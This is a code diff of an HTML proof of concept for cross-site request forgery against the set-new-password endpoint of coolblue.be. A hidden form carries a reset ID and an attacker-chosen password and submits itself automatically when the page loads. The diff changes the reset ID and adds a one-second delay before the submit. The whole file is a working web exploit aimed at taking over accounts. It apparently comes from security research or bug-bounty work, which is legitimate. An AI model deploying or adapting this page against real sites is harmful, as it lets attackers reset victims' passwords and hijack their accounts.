@@ -1,14 +1,19 @@
 <html>
   <body>
     <form action="https://www.coolblue.be/en/set-new-password" method="POST">
-      <input type="hidden" name="passwordResetId" value="0929E5EA08E7B7F17ED78AD5C48CC2BFFA70C471" />
+      <input type="hidden" name="passwordResetId" value="663C1AF73E9D5A050271A34CD549ED71DF23AC89" />
       <input type="hidden" name="password" value="Uilirecs123" />
       <input type="hidden" name="confirmPassword" value="Uilirecs123" />
       <input type="hidden" value="Submit request" />
     </form>
   </body>
   <script>
-    document.forms[0].submit();
+
+    setTimeout(function(){
+      //Wait 1 sec and login
+      document.forms[0].submit();
+    }, 1000);
+
   </script>
 </html>
 
